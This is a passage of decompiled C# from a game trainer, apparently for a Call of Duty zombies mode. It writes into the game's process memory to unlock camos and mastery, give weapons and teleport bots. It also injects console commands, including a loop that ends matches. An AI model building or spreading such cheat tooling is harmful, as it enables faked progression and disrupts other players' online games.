					long gclient = this.GetGClient(i);
					this.mem.WriteUInt(gclient + this.killPtr, 0U);
				}
			}
		}

		// Token: 0x06000290 RID: 656 RVA: 0x0000F3D0 File Offset: 0x0000F3D0
		private void skipPointer()
		{
			Main.skipround1 = this.GetGEntity(0) + 209880L;
			for (int i = 0; i < Main.skip.Length; i++)
			{
				Main.skip[i] = Main.skipround1 + 1528L * (long)i;
			}
		}

		// Token: 0x06000291 RID: 657 RVA: 0x0000F418 File Offset: 0x0000F418
		private void skipRounds_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < Main.skip.Length; i++)
			{
				this.mem.WriteInt(Main.skip[i], 0);
			}
		}

		// Token: 0x06000292 RID: 658 RVA: 0x0000F44C File Offset: 0x0000F44C
		private void checkBox9_CheckedChanged_1(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			if (Main.<>o__444.<>p__0 == null)
			{
				Main.<>o__444.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__444.<>p__0.Target(Main.<>o__444.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.checkBox9.Checked)
				{
					this.skipPointer();
					this.skipRounds.Start();
					return;
				}
				this.skipRounds.Stop();
			}
		}

		// Token: 0x06000293 RID: 659 RVA: 0x0000F4E4 File Offset: 0x0000F4E4
		private void thirteenButton12_Click_1(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure you want to use this? This will cause you not to earn any camos in-game!", "Warning!", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				if (Main.<>o__445.<>p__0 == null)
				{
					Main.<>o__445.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__445.<>p__0.Target(Main.<>o__445.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					this.sendCbuf("LobbyLaunchGame");
				}
			}
		}

		// Token: 0x06000294 RID: 660 RVA: 0x0000F56C File Offset: 0x0000F56C
		private void timer1_Tick_1(object sender, EventArgs e)
		{
			for (int i = 0; i < 4; i++)
			{
				this.GetGClient(i);
				this.setCamo(i, this.camo);
			}
			this.camo++;
			if (this.camo == 70)
			{
				this.camo = 62;
			}
		}

		// Token: 0x06000295 RID: 661 RVA: 0x0000F5BC File Offset: 0x0000F5BC
		public void setCamo(int client, int camo)
		{
			if (Main.<>o__448.<>p__0 == null)
			{
				Main.<>o__448.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__448.<>p__0.Target(Main.<>o__448.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + 23780L - 23588L, camo);
					this.mem.WriteInt(gclient + 23780L - 23524L, camo);
				}
			}
		}

		// Token: 0x06000296 RID: 662 RVA: 0x0000F670 File Offset: 0x0000F670
		private void checkBox2_CheckedChanged_2(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			if (Main.<>o__449.<>p__0 == null)
			{
				Main.<>o__449.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__449.<>p__0.Target(Main.<>o__449.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.checkBox2.Checked)
				{
					this.camo = 62;
					this.disco.RunWorkerAsync();
					return;
				}
				this.disco.CancelAsync();
			}
		}

		// Token: 0x06000297 RID: 663 RVA: 0x00005140 File Offset: 0x00005140
		private void groupBox4_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000298 RID: 664 RVA: 0x0000F708 File Offset: 0x0000F708
		private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.checkBox2.Checked)
			{
				for (int i = 0; i < 4; i++)
				{
					this.GetGClient(i);
					this.setCamo(i, this.camo);
				}
				this.camo++;
				if (this.camo == 70)
				{
					this.camo = 62;
				}
				Thread.Sleep(500);
			}
		}

		// Token: 0x06000299 RID: 665 RVA: 0x0000F76F File Offset: 0x0000F76F
		private void thirteenButton13_Click_1(object sender, EventArgs e)
		{
			this.sendCbuf("full_restart");
		}

		// Token: 0x0600029A RID: 666 RVA: 0x0000F77C File Offset: 0x0000F77C
		private void hideIPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.ipGridView.Rows[this.ipGridView.CurrentRow.Index].Cells[1].Value = "Hidden ;)";
		}

		// Token: 0x0600029B RID: 667 RVA: 0x00005140 File Offset: 0x00005140
		private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x0600029C RID: 668 RVA: 0x0000F7B3 File Offset: 0x0000F7B3
		private void thirteenButton16_Click_2(object sender, EventArgs e)
		{
			if (this.colorDialog1.ShowDialog() == DialogResult.OK)
			{
				this.button1.BackColor = this.colorDialog1.Color;
				this.theme = this.colorDialog1.Color;
			}
		}

		// Token: 0x0600029D RID: 669 RVA: 0x0000F7EC File Offset: 0x0000F7EC
		private void thirteenButton19_Click_1(object sender, EventArgs e)
		{
			this.thirteenForm1.AccentColor = this.theme;
			this.thirteenTabControl1.AccentColor = this.theme;
			this.panel1.BackColor = this.theme;
			this.panel3.BackColor = this.theme;
			this.linkLabel3.LinkColor = this.theme;
			this.linkLabel4.LinkColor = this.theme;
			this.dataGridView1.GridColor = this.theme;
			this.ipGridView.GridColor = this.theme;
			this.thirteenButton32.AccentColor = this.theme;
			this.thirteenButton33.AccentColor = this.theme;
			this.thirteenButton19.AccentColor = this.theme;
			this.thirteenButton16.AccentColor = this.theme;
			this.thirteenButton21.AccentColor = this.theme;
			this.thirteenButton25.AccentColor = this.theme;
			this.thirteenButton3.AccentColor = this.theme;
			this.thirteenButton7.AccentColor = this.theme;
			this.thirteenButton4.AccentColor = this.theme;
			this.thirteenButton30.AccentColor = this.theme;
			this.thirteenButton31.AccentColor = this.theme;
			this.thirteenButton18.AccentColor = this.theme;
			this.thirteenButton17.AccentColor = this.theme;
			this.thirteenButton10.AccentColor = this.theme;
			this.thirteenButton44.AccentColor = this.theme;
			this.thirteenButton6.AccentColor = this.theme;
			this.thirteenButton27.AccentColor = this.theme;
			this.thirteenButton26.AccentColor = this.theme;
			this.thirteenButton8.AccentColor = this.theme;
			this.thirteenButton22.AccentColor = this.theme;
			this.thirteenButton20.AccentColor = this.theme;
			this.thirteenButton9.AccentColor = this.theme;
			this.thirteenButton35.AccentColor = this.theme;
		}

		// Token: 0x0600029E RID: 670 RVA: 0x0000FA08 File Offset: 0x0000FA08
		private void config()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Config.ini";
			if (File.Exists(path))
			{
				string[] array = File.ReadAllText(path).Split(new char[]
				{
					'|'
				});
				Color color = Color.FromArgb(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]), Convert.ToInt32(array[2]));
				this.thirteenForm1.AccentColor = color;
				this.thirteenTabControl1.AccentColor = color;
				this.panel1.BackColor = color;
				this.panel3.BackColor = color;
				this.linkLabel3.LinkColor = color;
				this.linkLabel4.LinkColor = color;
				this.dataGridView1.GridColor = color;
				this.ipGridView.GridColor = color;
				this.thirteenButton32.AccentColor = color;
				this.thirteenButton33.AccentColor = color;
				this.thirteenButton19.AccentColor = color;
				this.thirteenButton16.AccentColor = color;
				this.thirteenButton21.AccentColor = color;
				this.thirteenButton25.AccentColor = color;
				this.thirteenButton3.AccentColor = color;
				this.thirteenButton7.AccentColor = color;
				this.thirteenButton4.AccentColor = color;
				this.thirteenButton30.AccentColor = color;
				this.thirteenButton31.AccentColor = color;
				this.thirteenButton18.AccentColor = color;
				this.thirteenButton17.AccentColor = color;
				this.thirteenButton44.AccentColor = color;
				this.thirteenButton10.AccentColor = color;
				this.thirteenButton6.AccentColor = color;
				this.thirteenButton27.AccentColor = color;
				this.thirteenButton26.AccentColor = color;
				this.thirteenButton8.AccentColor = color;
				this.thirteenButton22.AccentColor = color;
				this.thirteenButton20.AccentColor = color;
				this.thirteenButton9.AccentColor = color;
				this.thirteenButton35.AccentColor = color;
				this.theme = color;
			}
		}

		// Token: 0x0600029F RID: 671 RVA: 0x0000FBE4 File Offset: 0x0000FBE4
		private void thirteenButton20_Click_1(object sender, EventArgs e)
		{
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Config.ini", string.Concat(new string[]
			{
				this.theme.R.ToString(),
				"|",
				this.theme.G.ToString(),
				"|",
				this.theme.B.ToString()
			}));
		}

		// Token: 0x060002A0 RID: 672 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox3_CheckedChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060002A1 RID: 673 RVA: 0x0000FC63 File Offset: 0x0000FC63
		private void thirteenButton22_Click_2(object sender, EventArgs e)
		{
			this.theme = Color.FromArgb(138, 43, 226);
			this.button1.BackColor = this.theme;
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x0000FC90 File Offset: 0x0000FC90
		private void p1Camo_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < Main.camoweap1.Length; i++)
			{
				this.mem.WriteInt(Main.camoweap1[i], 2499);
			}
			for (int j = 0; j < Main.camoweap2.Length; j++)
			{
				this.mem.WriteInt(Main.camoweap2[j], 2499);
			}
			for (int k = 0; k < Main.camoweap3.Length; k++)
			{
				this.mem.WriteInt(Main.camoweap3[k], 2499);
			}
			for (int l = 0; l < Main.camoweap4.Length; l++)
			{
				this.mem.WriteByte(Main.camoweap4[l], 9);
			}
			for (int m = 0; m < Main.camoweap5.Length; m++)
			{
				this.mem.WriteByte(Main.camoweap5[m], 9);
			}
			for (int n = 0; n < Main.camoweap6.Length; n++)
			{
				this.mem.WriteByte(Main.camoweap6[n], 24);
			}
			for (int num = 0; num < Main.camoweap7.Length; num++)
			{
				this.mem.WriteByte(Main.camoweap7[num], 14);
			}
			for (int num2 = 0; num2 < Main.camogoldall.Length; num2++)
			{
				this.mem.WriteByte(Main.camogoldall[num2], 34);
			}
			for (int num3 = 0; num3 < Main.camogoldall2.Length; num3++)
			{
				this.mem.WriteByte(Main.camogoldall2[num3], 34);
			}
			for (int num4 = 0; num4 < Main.masteryarray1.Length; num4++)
			{
				this.mem.WriteInt(Main.masteryarray1[num4], 4999);
			}
			for (int num5 = 0; num5 < Main.masteryarray2.Length; num5++)
			{
				this.mem.WriteInt(Main.masteryarray2[num5], 4999);
			}
			for (int num6 = 0; num6 < Main.masteryarray3.Length; num6++)
			{
				this.mem.WriteInt(Main.masteryarray3[num6], 9999);
			}
			for (int num7 = 0; num7 < Main.masteryarray4.Length; num7++)
			{
				this.mem.WriteInt(Main.masteryarray4[num7], 9999);
			}
			this.times++;
			if (this.times <= 200)
			{
				this.p1Camo.Stop();
			}
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x0000FEF4 File Offset: 0x0000FEF4
		private void checkBox4_CheckedChanged_1(object sender, EventArgs e)
		{
			if (this.checkBox4.Checked)
			{
				if (Main.<>o__467.<>p__0 == null)
				{
					Main.<>o__467.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__467.<>p__0.Target(Main.<>o__467.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					this.onlineGame.RunWorkerAsync();
					return;
				}
			}
			this.onlineGame.CancelAsync();
			if (Main.<>o__467.<>p__1 == null)
			{
				Main.<>o__467.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__467.<>p__1.Target(Main.<>o__467.<>p__1, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteInt(this.mem.BaseAddress + 408444184L, 4129);
			}
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x0000FFFC File Offset: 0x0000FFFC
		private void onlineGame_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.checkBox13.Checked)
			{
				if (Main.<>o__468.<>p__0 == null)
				{
					Main.<>o__468.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__468.<>p__0.Target(Main.<>o__468.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					this.mem.WriteInt(this.mem.BaseAddress + this.onlineOffset, 33);
				}
				Thread.Sleep(50);
			}
		}

		// Token: 0x060002A5 RID: 677 RVA: 0x000100A0 File Offset: 0x000100A0
		private void teleportBots_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.checkBox12.Checked)
			{
				for (int i = 0; i < 18; i++)
				{
					long gclient = this.GetGClient(i);
					if (!this.mem.ReadString(gclient + 24716L).Contains("YKTV"))
					{
						this.mem.WriteFloat(gclient + 3560L, this.TeleportPos[0]);
						this.mem.WriteFloat(gclient + 3564L, this.TeleportPos[1]);
						this.mem.WriteFloat(gclient + 3568L, this.TeleportPos[2]);
					}
				}
				Thread.Sleep(50);
			}
		}

		// Token: 0x060002A6 RID: 678 RVA: 0x00010154 File Offset: 0x00010154
		private void cycleTest_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < 4; i++)
			{
				long gclient = this.GetGClient(i);
				int num = this.mem.ReadInt(gclient + this.killPtr);
				if (new string[]
				{
					"5",
					"6",
					"7",
					"8",
					"9"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponXM4PAP, i);
					return;
				}
				if (new string[]
				{
					"10",
					"11",
					"12",
					"13",
					"14"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponAK47PAP, i);
					return;
				}
				if (new string[]
				{
					"15",
					"16",
					"17",
					"18",
					"19"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponKrig6PAP, i);
					return;
				}
				if (new string[]
				{
					"20",
					"21",
					"22",
					"23",
					"24"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponQBZ83PAP, i);
					return;
				}
				if (new string[]
				{
					"25",
					"26",
					"27",
					"28",
					"29"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponFFAR1PAP, i);
					return;
				}
				if (new string[]
				{
					"30",
					"31",
					"32",
					"33",
					"34"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponGrozaPAP, i);
					return;
				}
				if (new string[]
				{
					"35",
					"36",
					"37",
					"38",
					"39"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponMP5PAP, i);
					return;
				}
				if (new string[]
				{
					"40",
					"41",
					"42",
					"43",
					"44"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponMilano821PAP, i);
					return;
				}
				if (new string[]
				{
					"45",
					"46",
					"47",
					"48",
					"48"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponAk74uPAP, i);
					return;
				}
				if (new string[]
				{
					"50",
					"51",
					"52",
					"53",
					"54"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponKSP45PAP, i);
					return;
				}
				if (new string[]
				{
					"55",
					"56",
					"57",
					"58",
					"59"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponBullfrogPAP, i);
					return;
				}
				if (new string[]
				{
					"60",
					"61",
					"62",
					"63",
					"64"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponMac10PAP, i);
					return;
				}
				if (new string[]
				{
					"65",
					"66",
					"67",
					"68",
					"69"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponType63PAP, i);
					return;
				}
				if (new string[]
				{
					"70",
					"71",
					"72",
					"73",
					"74"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponM16PAP, i);
					return;
				}
				if (new string[]
				{
					"75",
					"76",
					"77",
					"78",
					"79"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponAUGPAP, i);
					return;
				}
				if (new string[]
				{
					"80",
					"81",
					"82",
					"83",
					"84"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponDMR14PAP, i);
					return;
				}
				if (new string[]
				{
					"85",
					"86",
					"87",
					"88",
					"89"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponStoner63PAP, i);
					return;
				}
				if (new string[]
				{
					"90",
					"91",
					"92",
					"93",
					"94"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponRPDPAP, i);
					return;
				}
				if (new string[]
				{
					"95",
					"96",
					"97",
					"98",
					"99"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponM60PAP, i);
					return;
				}
				if (new string[]
				{
					"100",
					"101",
					"102",
					"103",
					"104"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponPelington703PAP, i);
					return;
				}
				if (new string[]
				{
					"105",
					"106",
					"107",
					"108",
					"109"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponLW3TundraPAP, i);
					return;
				}
				if (new string[]
				{
					"110",
					"111",
					"112",
					"113",
					"114"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponM82PAP, i);
					return;
				}
				if (new string[]
				{
					"115",
					"116",
					"117",
					"118",
					"119"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.Weapon1911PAP, i);
					return;
				}
				if (new string[]
				{
					"120",
					"121",
					"122",
					"123",
					"124"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponMagnumPAP, i);
					return;
				}
				if (new string[]
				{
					"125",
					"126",
					"127",
					"128",
					"129"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponDiamattiPAP, i);
					return;
				}
				if (new string[]
				{
					"130",
					"131",
					"132",
					"133",
					"134"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponHauer77PAP, i);
					return;
				}
				if (new string[]
				{
					"135",
					"136",
					"137",
					"138",
					"139"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponGalloSA12PAP, i);
					return;
				}
				if (new string[]
				{
					"140",
					"141",
					"142",
					"143",
					"144"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponStreetSweeperPAP, i);
					return;
				}
				if (new string[]
				{
					"145",
					"146",
					"147",
					"148",
					"149"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponKnifePAP, i);
					return;
				}
				if (new string[]
				{
					"150",
					"151",
					"152",
					"153",
					"154",
					"155",
					"156",
					"157",
					"158",
					"159"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponCigma2PAP, i);
					return;
				}
				if (new string[]
				{
					"160",
					"161",
					"162",
					"163",
					"164",
					"165",
					"166",
					"167",
					"168",
					"169"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponRPG7PAP, i);
					return;
				}
				if (new string[]
				{
					"170",
					"171",
					"172",
					"173",
					"174",
					"175",
					"176",
					"177",
					"178",
					"179"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponM79PAP, i);
					return;
				}
				if (new string[]
				{
					"180",
					"181",
					"182",
					"183",
					"184",
					"185"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponFARA83PAP, i);
					return;
				}
				if (new string[]
				{
					"186",
					"187",
					"188",
					"189",
					"190",
					"191"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponLC10PAP, i);
					return;
				}
				if (new string[]
				{
					"192",
					"193",
					"194",
					"195",
					"196",
					"197"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponMachetePAP, i);
					return;
				}
				if (new string[]
				{
					"198",
					"199",
					"200",
					"201",
					"202",
					"203"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponZRGmmEPAP, i);
					return;
				}
				if (new string[]
				{
					"204",
					"205",
					"206",
					"207",
					"208",
					"209"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponETool2PAP, i);
					return;
				}
				if (new string[]
				{
					"210",
					"211",
					"212",
					"213",
					"214",
					"215"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponSledgeHammerPAP, i);
					return;
				}
				if (new string[]
				{
					"216",
					"217",
					"218",
					"219",
					"220",
					"221"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponWakizashiPAP, i);
					return;
				}
				if (new string[]
				{
					"222",
					"223",
					"224",
					"225",
					"226",
					"227"
				}.Contains(num.ToString()))
				{
					this.giveWeapon2(Main.WeaponR1ShadowhunterCrossbowPAP, i);
					return;
				}
			}
		}

		// Token: 0x060002A7 RID: 679 RVA: 0x00010DB8 File Offset: 0x00010DB8
		private void thirteenButton29_Click_3(object sender, EventArgs e)
		{
			if (Main.<>o__471.<>p__0 == null)
			{
				Main.<>o__471.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__471.<>p__0.Target(Main.<>o__471.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long pointerInt = this.mem.GetPointerInt(this.mem.BaseAddress + this.fastRun, new long[]
				{
					130047L
				}, 1);
				File.WriteAllBytes("0x1FBFF.bin", this.mem.ReadBytes(pointerInt, 471880));
			}
		}

		// Token: 0x060002A8 RID: 680 RVA: 0x00010E68 File Offset: 0x00010E68
		private void thirteenButton34_Click(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			this.endGame.RunWorkerAsync();
		}

		// Token: 0x060002A9 RID: 681 RVA: 0x00010E7C File Offset: 0x00010E7C
		private void sendCbufendgame(string cmd)
		{
			if (Main.<>o__473.<>p__0 == null)
			{
				Main.<>o__473.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__473.<>p__0.Target(Main.<>o__473.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteString(this.mem.ReadInt64(this.mem.BaseAddress + this.cbufOffset), cmd);
				this.mem.WriteBool(this.mem.ReadInt64(this.mem.BaseAddress + this.cbufOffset) - 27L, true);
			}
		}

		// Token: 0x060002AA RID: 682 RVA: 0x00010F3C File Offset: 0x00010F3C
		private void endGame_DoWork(object sender, DoWorkEventArgs e)
		{
			for (int i = 0; i < 500; i++)
			{
				this.sendCbufendgame("cmd mr " + i.ToString() + " -1 endround 0");
			}
			this.endGame.CancelAsync();
		}

		// Token: 0x060002AB RID: 683 RVA: 0x00010F80 File Offset: 0x00010F80
		private void p2Camo_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < Main.p2camoweap1.Length; i++)
			{
				this.mem.WriteInt(Main.p2camoweap1[i], 2499);
			}
			for (int j = 0; j < Main.p2camoweap2.Length; j++)
			{
				this.mem.WriteInt(Main.p2camoweap2[j], 2499);
			}
			for (int k = 0; k < Main.p2camoweap3.Length; k++)
			{
				this.mem.WriteInt(Main.p2camoweap3[k], 2499);
			}
			for (int l = 0; l < Main.p2camoweap4.Length; l++)
			{
				this.mem.WriteByte(Main.p2camoweap4[l], 9);
			}
			for (int m = 0; m < Main.p2camoweap5.Length; m++)
			{
				this.mem.WriteByte(Main.p2camoweap5[m], 9);
			}
			for (int n = 0; n < Main.p2camoweap6.Length; n++)
			{
				this.mem.WriteByte(Main.p2camoweap6[n], 24);
			}
			for (int num = 0; num < Main.p2camoweap7.Length; num++)
			{
				this.mem.WriteByte(Main.p2camoweap7[num], 14);
			}
			for (int num2 = 0; num2 < Main.p2camogoldall.Length; num2++)
			{
				this.mem.WriteByte(Main.p2camogoldall[num2], 34);
			}
			for (int num3 = 0; num3 < Main.p2camogoldall2.Length; num3++)
			{
				this.mem.WriteByte(Main.p2camogoldall2[num3], 34);
			}
			for (int num4 = 0; num4 < Main.p2masteryarray1.Length; num4++)
			{
				this.mem.WriteInt(Main.p2masteryarray1[num4], 4999);
			}
			for (int num5 = 0; num5 < Main.p2masteryarray2.Length; num5++)
			{
				this.mem.WriteInt(Main.p2masteryarray2[num5], 4999);
			}
			for (int num6 = 0; num6 < Main.p2masteryarray3.Length; num6++)
			{
				this.mem.WriteInt(Main.p2masteryarray3[num6], 9999);
			}
			for (int num7 = 0; num7 < Main.p2masteryarray4.Length; num7++)
			{
				this.mem.WriteInt(Main.p2masteryarray4[num7], 9999);
			}
			this.timesp2++;
			if (this.timesp2 <= 200)
			{
				this.p2Camo.Stop();
			}
		}

		// Token: 0x060002AC RID: 684 RVA: 0x000111E4 File Offset: 0x000111E4
		private void p3Camo_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < Main.p3camoweap1.Length; i++)
			{
				this.mem.WriteInt(Main.p3camoweap1[i], 2499);
			}
			for (int j = 0; j < Main.p3camoweap2.Length; j++)
			{
				this.mem.WriteInt(Main.p3camoweap2[j], 2499);
			}
			for (int k = 0; k < Main.p3camoweap3.Length; k++)
			{
				this.mem.WriteInt(Main.p3camoweap3[k], 2499);
			}
			for (int l = 0; l < Main.p3camoweap4.Length; l++)
			{
				this.mem.WriteByte(Main.p3camoweap4[l], 9);
			}
			for (int m = 0; m < Main.p3camoweap5.Length; m++)
			{
				this.mem.WriteByte(Main.p3camoweap5[m], 9);
			}
			for (int n = 0; n < Main.p3camoweap6.Length; n++)
			{
				this.mem.WriteByte(Main.p3camoweap6[n], 24);
			}
			for (int num = 0; num < Main.p3camoweap7.Length; num++)
			{
				this.mem.WriteByte(Main.p3camoweap7[num], 14);
			}
			for (int num2 = 0; num2 < Main.p3camogoldall.Length; num2++)
			{
				this.mem.WriteByte(Main.p3camogoldall[num2], 34);
			}
			for (int num3 = 0; num3 < Main.p3camogoldall2.Length; num3++)
			{
				this.mem.WriteByte(Main.p3camogoldall2[num3], 34);
			}
			for (int num4 = 0; num4 < Main.p3masteryarray1.Length; num4++)
			{
				this.mem.WriteInt(Main.p3masteryarray1[num4], 4999);
			}
			for (int num5 = 0; num5 < Main.p3masteryarray2.Length; num5++)
			{
				this.mem.WriteInt(Main.p3masteryarray2[num5], 4999);
			}
			for (int num6 = 0; num6 < Main.p3masteryarray3.Length; num6++)
			{
				this.mem.WriteInt(Main.p3masteryarray3[num6], 9999);
			}
			for (int num7 = 0; num7 < Main.p3masteryarray4.Length; num7++)
			{
				this.mem.WriteInt(Main.p3masteryarray4[num7], 9999);
			}
			this.timesp3++;
			if (this.timesp3 <= 200)
			{
				this.p3Camo.Stop();
			}
		}

		// Token: 0x060002AD RID: 685 RVA: 0x00011448 File Offset: 0x00011448
		private void p4Camo_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < Main.p4camoweap1.Length; i++)
			{
				this.mem.WriteInt(Main.p4camoweap1[i], 2499);
			}
			for (int j = 0; j < Main.p4camoweap2.Length; j++)
			{
				this.mem.WriteInt(Main.p4camoweap2[j], 2499);
			}
			for (int k = 0; k < Main.p4camoweap3.Length; k++)
			{
				this.mem.WriteInt(Main.p4camoweap3[k], 2499);
			}
			for (int l = 0; l < Main.p4camoweap4.Length; l++)
			{
				this.mem.WriteByte(Main.p4camoweap4[l], 9);
			}
			for (int m = 0; m < Main.p4camoweap5.Length; m++)
			{
				this.mem.WriteByte(Main.p4camoweap5[m], 9);
			}
			for (int n = 0; n < Main.p4camoweap6.Length; n++)
			{
				this.mem.WriteByte(Main.p4camoweap6[n], 24);
			}
			for (int num = 0; num < Main.p4camoweap7.Length; num++)
			{
				this.mem.WriteByte(Main.p4camoweap7[num], 14);
			}
			for (int num2 = 0; num2 < Main.p4camogoldall.Length; num2++)
			{
				this.mem.WriteByte(Main.p4camogoldall[num2], 34);
			}
			for (int num3 = 0; num3 < Main.p4camogoldall2.Length; num3++)
			{
				this.mem.WriteByte(Main.p4camogoldall2[num3], 34);
			}
			for (int num4 = 0; num4 < Main.p4masteryarray1.Length; num4++)
			{
				this.mem.WriteInt(Main.p4masteryarray1[num4], 4999);
			}
			for (int num5 = 0; num5 < Main.p4masteryarray2.Length; num5++)
			{
				this.mem.WriteInt(Main.p4masteryarray2[num5], 4999);
			}
			for (int num6 = 0; num6 < Main.p4masteryarray3.Length; num6++)
			{
